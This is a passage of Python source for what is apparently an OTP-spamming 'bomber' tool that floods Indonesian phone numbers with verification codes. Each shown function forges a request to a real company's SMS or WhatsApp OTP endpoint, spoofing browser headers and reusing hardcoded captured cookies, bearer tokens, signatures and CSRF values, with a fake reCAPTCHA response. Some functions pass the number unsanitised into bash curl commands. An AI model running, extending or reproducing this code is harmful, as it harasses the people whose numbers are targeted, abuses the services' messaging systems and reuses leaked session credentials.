            'authorization': f'Bearer {token}',
            'client-platform': 'WEB',
            'client-timestamp': str(int(time.time() * 1000)),
            'content-type': 'application/json',
            'origin': 'https://www.mapclub.com',
            'referer': 'https://www.mapclub.com/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
        }
        
        payload = {
            "account": nomor,
            "prefix": "62"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_ruparupa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor
        
        # Generate rr-sid
        rr_sid = f"ufiO{int(time.time())}XymEEjG06H"
        
        url = 'https://wapi.ruparupa.com/klk/manage-otp-request'
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6MTQ3NTAwODcsImlhdCI6MTc4MjgxOTA3OSwiaXNzIjoid2FwaS5ydXBhcnVwYSJ9.dccGwwtX4HaSt2W5p_huJ7zTzRiaaZcxdNorNjR6iQo',
            'b2b-type': 'non-b2b',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.ruparupa.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.ruparupa.com/',
            'rr-sid': rr_sid,
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'user-platform': 'desktop',
            'x-company-name': 'ruparupa',
            'x-frontend-type': 'desktop'
        }
        
        payload = {
            "otpRequestType": "verify-phone",
            "action": "onMountOrResend",
            "channel": "WhatsApp",
            "phone": nomor
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_cashenable(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor
        
        import uuid
        device_id = str(uuid.uuid4())
        
        url = 'https://api.cashenable.com/authentication/v2/coreauth'
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache, no-store, must-revalidate, max-age=0',
            'content-type': 'application/json',
            'device_id': device_id,
            'device_name': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'device_type': 'desktop',
            'expires': '0',
            'origin': 'https://desktop.labamu.co.id',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://desktop.labamu.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'source': 'Desktop',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36'
        }
        
        payload = {
            "identifier": nomor,
            "auth_method": "whatsapp"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 201
        
    except Exception as e:
        return False

def spam_otp_eraspace(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        device_id = "5f9a82ca-f6c9-4f53-9381-9f90bb7d6959"
        epoch = "1782980896"
        signature = "bc66090c506a1847f5a5cd044ba3643b9d655e489b36bcff1533ef813ad882d0"

        url = 'https://jeanne.eraspace.com/customers/v3/otp/request'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=',
            'content-type': 'application/json',
            'device-id': device_id,
            'epoch': epoch,
            'origin': 'https://eraspace.com',
            'otp-client': 'eraspace',
            'otp-provider': 'whatsapp',
            'referer': 'https://eraspace.com/',
            'signature': signature,
            'sms-client': 'eraspace',
            'source': 'eraspace',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }

        payload = {
            "identifier": nomor,
            "regionCode": "ID",
            "type": "identifier_validation"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False
        
def spam_otp_oyorooms(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if len(nomor) < 10:
            return False
        
        session = requests.Session()
        
        cookies = {
            'delta_ver': '1783169391.895.680.781361|30a98be7397e93d8ee905a77f63b5c5a',
            '_csrf': 'z2qem89SAImhv-99mY7Qz43S',
            'acc': 'IN',
            'locale': 'id',
            'X-Location': 'undefined',
            'mab': 'bb752a6c73fad035dc2ea0697579750f',
            'expd': 'mww2%3A1%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A0%7Clbhw%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A0%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Cspw1%3A0%7Cstrf%3A1%7Cltvr%3A1%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A1%7Cprwt%3A1%7Ccbhd%3A1%7Cins2%3A3%7Cmcal%3A1%7Cmhdc%3A1%7Cmcal%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Cmbwe%3A0%7Cmboe%3A0%7Cctry%3A1%7Cmshd%3A1%7Csovb%3A2%7Cctrm%3A1%7Cofcr%3A1%7Ciupi%3A1%7Cnbi1%3A3%7Crwtg%3A1%7Cstow%3A1%7Cimtg%3A2%7Cptpa%3A1%7Cormp%3A1%7Cpbre%3A0%7Cllat%3A0%7Cesmi%3A0%7Chdam%3A0',
            'appData': '%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D',
            'token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D',
            '_uid': 'Not%20logged%20in',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw',
            'ql': 'true',
            '_gcl_au': '1.1.1098408214.1783169392',
            'isHomepageViewed': 'true',
            'fingerprint2': 'a19e43fe531de889917ff09bd9c00e3b',
            '_ga': 'GA1.2.301009132.1783169392',
            '_gid': 'GA1.2.1435061004.1783169397'
        }
        
        session.cookies.update(cookies)
        
        fingerprint = "a19e43fe531de889917ff09bd9c00e3b"
        device_id = fingerprint + "530311"
        sdata = "eyJrdWQiOlsyNDIwMCwxNDUwMCwxMjcwMCwxOTUwMCwxMzkwMCwxNDAwMCwxNDUwMCwxNzAwMCwxMzcwMCwxMzAwMCwxMTkwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6WzE2MDAsMzAyMDAsNDQ5MDAsNDE1NzAwLDMxMTUwMCwyOTY4MDAsMzQ1NDAwLDM5NTcwMCwyOTYyMDAsMjEzODAwLDk2NTAwLDk3NjAwLDExMjEwMCwxNzkyMDAsMTE0NjAwLDE0NjcwMCw5NjQwMCwzMjY0MDAsMzQ0NjAwLDMyODQwMCwzMjgwMDAsMzYwNzAwLDUxMTMwMCw2NDQ0MDAsMzEzNzAwLDI4NzAwLDYxNjAwLDk1MzAwXSwidGlkIjpbNTYzMTAwMCwxNzM2MDIwMCw2MTk4MTAwLDExMzQwMDAsMzA0MjAwLDIwMTkwMCwyMjA5MDAsMjIwNTAwLDE4NjcwMCwxNjkwMDAsNTY4ODAwLDcwMjMwMCw5Njk5MDAsMjg3MDAwLDUzNTAwMCw3MTg3MDAsNjAyODAwLDEyMjE2MDAsMTcxMTAwLDIwNjEwMCwyMjA0MDAsMTg4MzAwLDE3MTMwMCw2NTYwMDAsMzM1NzAwLDM4NjgwMCw4MDIyNzgwMCwxMTc5MzQwMF0sImtpZCI6WzEyNzM5MTEwMCwxOTM1MDAsMjMyMTAwLDIyMjUwMCwyNDU5MDAsMjY5MzAwLDE1MjMwMCwyMzQ2MDAsMTY2NjAwLDIwNDEwMCwxODYyMDBdLCJ0bXYiOltbeyJ4IjoyNDcsInkiOjM2OX0seyJ4IjoyNTUsInkiOjM0Mn0seyJ4IjozMjcsInkiOjE4OX0seyJ4IjozMzUsInkiOjE3Nn1dLFt7IngiOjI1NSwieSI6MzYyfSx7IngiOjI1OSwieSI6MzU0fSx7IngiOjM0NywieSI6MTc4fSx7IngiOjM1MSwieSI6MTcyfV0sW3sieCI6MjQwLCJ5Ijo1MTZ9LHsieCI6MjM4LCJ5Ijo1MjZ9LHsieCI6MjM3LCJ5Ijo1Mzh9LHsieCI6MjM3LCJ5Ijo1NDB9LHsieCI6MjM3LCJ5Ijo1Mzl9XSxbeyJ4IjoyNTUsInkiOjM1MX0seyJ4IjoyNTMsInkiOjM1OX0seyJ4IjoyMzUsInkiOjUwMH0seyJ4IjoyMzUsInkiOjUyNX0seyJ4IjoyMzUsInkiOjUzN31dLFt7IngiOjIwMCwieSI6MzIxfSx7IngiOjIwNSwieSI6MzA3fSx7IngiOjIyMywieSI6MjU2fSx7IngiOjIyMywieSI6MjU2fV1dfQ=="
        
        headers = {
            'accept': '*/*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://identity-gateway.oyorooms.com',
            'referer': 'https://identity-gateway.oyorooms.com/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
            'deviceid': device_id,
            'fingerprint_hash': fingerprint,
            'loc': '153',
            'sData': sdata,
            'externalHeaders': '[object Object]',
            'XSRF-TOKEN': 'bYRZoRu5-6fyXF51wSMdrrS0EAYDpphLOsfw'
        }
        
        payload = {
            "phone": nomor,
            "country_code": "+62",
            "nod": 4
        }
        
        r = session.post('https://identity-gateway.oyorooms.com/api/pwa/generateotp?locale=id',
            json=payload,
            headers=headers,
            timeout=10
        )
        
        if r.status_code == 200:
            try:
                data = r.json()
                status = data.get('status', '')
                is_user_present = data.get('is_user_present', False)
                
                if status == "correct" and is_user_present:
                    return True
                elif status == "correct" and not is_user_present:
                    return False
                else:
                    return False
            except:
                return True if r.status_code == 200 else False
        else:
            return False
        
    except Exception as e:
        return False
        
def spam_otp_speedcash_sms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        import subprocess
        import json

        cookie = '_gcl_au=1.1.179635825.1783143670; _tt_enable_cookie=1; _ttp=01KWNTA9MFMPRKVN4403SGAP5F_.tt.2; _gid=GA1.3.23590014.1783143677; page=eyJpdiI6IndNdG9LMWFLcnNQekhqMEhKcFwvb0VnPT0iLCJ2YWx1ZSI6IitCXC8xd2E2MXJlejhYZmxsN2k0ZzhRPT0iLCJtYWMiOiJlYjM2OWViNDA3NTJkNDk0YzExZjBiMDYwZDBkNDY0ZGIwZjgzNGNkMjNhMGMzNmY4ZWNmYWFmYjk1NDdiNWU0In0%3D; ttcsid_BQG0RGGAC2KB0QR0PJOG=1783161126775::fUH_lmHk7dEJSxbUqs_Q.2.1783161197355.1; ttcsid=1783161126780::Ub-TvvCt0eosFi2US8Ta.2.1783161197354.0::1.-2978.0::70607.4.265.339::0.0.0; XSRF-TOKEN=eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9; speedcash_session=eyJpdiI6Inc1V211ZG1VZVhvWHRCREpkNlg5M2c9PSIsInZhbHVlIjoiRlUwaVFmMTZcL1wvQk4rZUhpT28rK2x6MjhGaHl6U3hlVGVJdHdVbWVxWW9LR0RDdXBcL1pMRjl4Y2NvMWZZTHhScCIsIm1hYyI6ImJhMzFmN2I0MzgxNjkyZmE0MDVhZTIyMmY0YTdkNGU2MDhmYmQyYjQyYjA2MTQzYWRiODBiNTRiNGU4ZGRlZDkifQ%3D%3D; _ga_K62HPWSYN0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_YYBXGTQ7Y7=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_36YJ2HBQBW=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h0; _ga_L47B4F33R0=GS2.1.s1783161125$o2$g1$t1783161200$j58$l0$h885576571; _ga=GA1.3.1971373087.1783143671; x-csrf-token=b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a%7C3e19bf11f091623f6a3a179f6bd95740c64fdeca0cb7ed897449c093e7e888c4; _gat_UA-62117787-3=1'

        xsrf = 'eyJpdiI6IjdaVHpFODVWY0V0b21jYjk4enhcLzFBPT0iLCJ2YWx1ZSI6ImNkcVNNblwvbUlrdXNMck5ndEh6M1J6dGhqTU9YTlF5OFBNN3FNQ3oxK3VIVlFMcGtnUkJSbXBKMEtyRGZONGlEIiwibWFjIjoiZWY0OTUwZDFmYzcxMDA1MDI3ZWI0YzhlNTI2YjQ5ODI1ZTc2YmJhNTkwYTZkOGQ0MzZlNTFiYTg1ZWE0OWMxNSJ9'

        csrf = 'b7001f72363a50f6976f8ad85bbfe8cab97b1a131a3be8c0ab0225ef069f10e1903ab21033744f14a28dcb8df03346eb685a0b46ca2a6000cf649e29b2ad7b5a'

        payload = json.dumps({
            "version_name": "3.2.0",
            "version_code": "270",
            "uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "user_uuid": "0489f8f6-49cd-5a10-9fae-7e1297fdd015",
            "via": "BB MOBILE WEB",
            "app_id": "SPEEDCASH",
            "appid": "SPEEDCASH",
            "location": "0,0",
            "phone": phone,
            "state": "REGISTER",
            "type": "SMS"
        })

        curl_otp = f'''curl -s -X POST 'https://member.speedcash.co.id/api/twice/otp/generate' \\
  -H 'authorization: Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2' \\
  -H 'content-type: application/json' \\
  -H 'cookie: {cookie}' \\
  -H 'origin: https://member.speedcash.co.id' \\
  -H 'referer: https://member.speedcash.co.id/' \\
  -H 'x-csrf-token: {csrf}' \\
  -H 'x-xsrf-token: {xsrf}' \\
  -d '{payload}' '''

        result = subprocess.run(['bash', '-c', curl_otp], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('rc') == '00'
            except:
                return False
        return False

    except Exception as e:
        return False
        
def spam_otp_kitabisa_wea(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        
        import subprocess
        import json
        
        payload = json.dumps({
            "full_name": "Fahri reza",
            "username": nomor,
            "otp_type": "whatsapp"
        })
        
        curl_command = f'''curl -s -X POST 'https://gate.kitabisa.com/wong/register/draft' \\
  -H 'accept: application/json' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://accounts.kitabisa.com' \\
  -H 'referer: https://accounts.kitabisa.com/' \\
  -H 'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' \\
  -H 'version: 3.4.0' \\
  -H 'x-ktbs-api-version: 1.0.0' \\
  -H 'x-ktbs-client-name: kanvas' \\
  -H 'x-ktbs-client-version: 1.0.0' \\
  -H 'x-ktbs-platform-name: kanvas' \\
  -H 'x-ktbs-request-id: 1c3f6c98-2007-4124-933a-946348406887' \\
  -H 'x-ktbs-signature: cf6bb271fda15fb3083a336e71b27db7d3e6b410a2026d7e377f1cd5cdb83645' \\
  -H 'x-ktbs-time: 1782837706' \\
  -d '{payload}' '''
        
        result = subprocess.run(['bash', '-c', curl_command], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                return data.get('response_code') == '000000'
            except:
                return False
        return False
        
    except Exception as e:
        return False

def spam_otp_auto2000(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        url = 'https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp'
        
        headers = {
            'Host': 'auto2000.co.id',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile': '?1',
            'baggage': 'sentry-environment=PRD,sentry-public_key=a9168ed9e0239b8f02f772e5cb953cbf,sentry-trace_id=7d8e539a8fb54552a1cc3aac6fb1404d,sentry-transaction=%2Flogin,sentry-sampled=true,sentry-sample_rand=0.21923493905699087,sentry-sample_rate=1',
            'sentry-trace': '7d8e539a8fb54552a1cc3aac6fb1404d-88ab5675ac537dca-1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://auto2000.co.id',
            'Referer': 'https://auto2000.co.id/login',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': 'UU_PDP_CHECKBOX_CONTENT=PHA+U2F5YSBzZXR1anUgdW50dWsgbWVuZXJpbWEgcHJvZ3JhbSBwcm9tb3NpIGRhbiBsYXlhbmFuIGRhcmkgQXV0bzIwMDAgc2VzdWFpIGRlbmdhbiA8c3BhbiBzdHlsZT0iY29sb3I6cmdiKDAsIDEwMiwgMjA0KSI+PHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj48L3NwYW4+PHNwYW4+IGRhbiA8L3NwYW4+PHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4geWFuZyBiZXJsYWt1LjwvcD4%3D; UU_PDP_POPUP_CONTENT=PHA+PHN0cm9uZz5TYWxhbSBBdXRvRmFtaWx5IEJhcGFrL0lidSB7Y3VzdG9tZXJOYW1lfSE8L3N0cm9uZz48L3A+PHA+PGJyIC8+PC9wPjxwPlRlcmltYSBrYXNpaCB0ZWxhaCBtZW1pbGloIEF1dG8yMDAwLiBLbGlrIOKAnFNldHVqdeKAnSB1bnR1ayBwZW5nYWxhbWFuIG9wdGltYWwgJmFtcDsgcGVyc29uYWxpc2FzaSBsYXlhbmFuIHNlc3VhaSBkZW5nYW4gPHNwYW4gaWQ9InN5YXJhdC1rZXRlbnR1YW4iIHN0eWxlPSJjb2xvcjpyZ2IoMCwgMTAyLCAyMDQpO2N1cnNvcjpwb2ludGVyIj5TeWFyYXQgZGFuIEtldGVudHVhbjwvc3Bhbj4gJmFtcDsgPHNwYW4gaWQ9InBlbWJlcml0YWh1YW4tcHJpdmFzaSIgc3R5bGU9ImNvbG9yOnJnYigwLCAxMDIsIDIwNCk7Y3Vyc29yOnBvaW50ZXIiPlBlbWJlcml0YWh1YW4gUHJpdmFzaTwvc3Bhbj4uPC9wPg%3D%3D; __gcl_au=1.1.1768235826.1784098499; _ga=GA1.1.195703634.1784098502; _fbp=fb.2.1784098503407.212865537130129769; _tt_enable_cookie=1; _ttp=01KXJ8XFB6NA5CZT43HK9H4DC3_.tt.2; cf_clearance=WGR.MGEa4UU0ZxdEVIwLOv5sfHpdgKnUG916yHcVigE-1784474119-1.2.1.1-tsze3pbi8pCNyF_J11EryCZz7P78u_cYluNy.PNJBIxYh9zhM4_pto2BBAd6f65.6CuMSSQPLuRQojy5gGtMYqvp_vfm1IQ9W42VuDhBETtRR9OiJf6B7y4gP0JwKHEXZkFbfNugtKdonoXSQmezhr.gX1a8LpuEUwKb_1ebP_AKmck6z0YnBK6zfxZsaptPT24wViudMt7eTeo8zJcUwRuAsW2kiMR5xj2kL774YNdaS8ZZpfc8BmSOGQt64sCVT9Jy9wT0W9LKcRVqoUH0Xht_8F68VYi5I29VIrK4OSVRTSrT..RNpyZXmxknlYkZHZOTQzLqKgSZQ5_nlUSgFg; __cf_bm=N.yhTYi6ikXVdOVLPWJrfc4gfnJqvkHA4pysnjPjp9k-1784474119.371274-1.0.1.1-GQ.D5nngKtBUGDeO5ueyHgFNNdWXLHdxtsxcUE63Tnpyx4wSdsy2yplAjPoQOly7gwY36P9bonbnnEoUMfvlAJP2DFAhfQspOpEhms6XXUsD1.9ejWiU3nk_RQXiSiGq; scarab.visitor=%22195488A3EF1F1312%22; hardwareId=EMS2D-AF23A_4955e428-f3e9-43db-8d3a-7e0c71350f52; _gcl_au=1.1.1919541313.1784098500.-.-.1784474130.450855288.1784474131.1784474130; mycookies=s7; system_token=uSiiHEFq6k_cwJDq-Kn_sV0csNc; ttcsid=1784474133713::0WWL-1SZUwys7jVXthPb.2.1784474138259.0::1.-20188.213::4440.2.440.578::0.0.0; ttcsid_C6FGON96L5602R4VI2T0=1784474133705::vmd0mCMg8vz-zJIItvYq.2.1784474138260.0; ttcsid_D2I412BC77U9B02M0UGG=1784474133725::W9t_dL9b1tFKGthRORIF.2.1784474138261.0; _ga_RB1QMC9XF8=GS2.1.s1784474131$o2$g0$t1784474138$j53$l0$h1755439970'
        }
        
        payload = {
            "phoneNumber": phone,
            "isCheckOtpLimit": False,
            "uniqueID": phone,
            "isLogin": False
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
        
    except Exception as e:
        return False

def spam_otp_carro(phone):
    try:
        p = normalize_phone(phone)
        if p.startswith('0'):
            msisdn = '+62' + p[1:]
        elif p.startswith('62'):
            msisdn = '+' + p
        else:
            msisdn = '+' + p

        session = requests.Session()

        headers_get = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://carro.co/",
            "User-Agent": random.choice(USER_AGENTS),
        }
        session.get("https://carro.co/", headers=headers_get, timeout=15)

        url = "https://carro.co/_actions/requestOtp"
        headers_post = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://carro.co",
            "Referer": "https://carro.co/id/id",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Requested-With": "XMLHttpRequest",
        }
        payload = {
            "countryCode": "id",
            "locale": "id",
            "mobileNumber": msisdn,
            "provider": "whatsapp",
            "recaptchaAction": "id_idid_requestOtp",
            "recaptchaResponse": "dummy_recaptcha_response_12345"
        }
        resp = session.post(url, json=payload, headers=headers_post, timeout=30)

        if 200 <= resp.status_code <= 299:
            try:
                data = resp.json()
                if data.get("success") == True or data.get("status") == "success":
                    return True
            except:
                pass
            return True
        return False
    except:
        return False
        
def spam_otp_amaha(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        if nomor.startswith('0'):
            nomor = nomor[1:]
        
        import subprocess
        import json
        
        url = f"https://api.theinnerhour.com/v1/get_otp?country_code=62&mobile_country=Indonesia&mobile={nomor}&login=yes"
        
        curl_cmd = f"""curl -s -X GET '{url}' \\
  -H 'accept: */*' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'origin: https://www.amahahealth.com' \\
  -H 'referer: https://www.amahahealth.com/' \\
  -H 'sec-ch-ua: "Google Chrome";v="150", "Chromium";v="150", "Not)A;Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'priority: u=1, i' \\
  -H 'platform: mobile' \\
  -H 'x-country: IN' \\
  -H 'x-timezone: Asia/Jakarta'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success' or data.get('otp_sent'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_idealz(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.idealzlebanon.com/on/demandware.store/Sites-idealz-lb-Site/en/Gupshup-SmsAuthWeb' \\
  -H 'host: www.idealzlebanon.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.idealzlebanon.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.idealzlebanon.com/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  --data-raw 'phoneNumber={nomor}&countryCode=%2B62&isApp=false&mode=whatsapp'"""
        
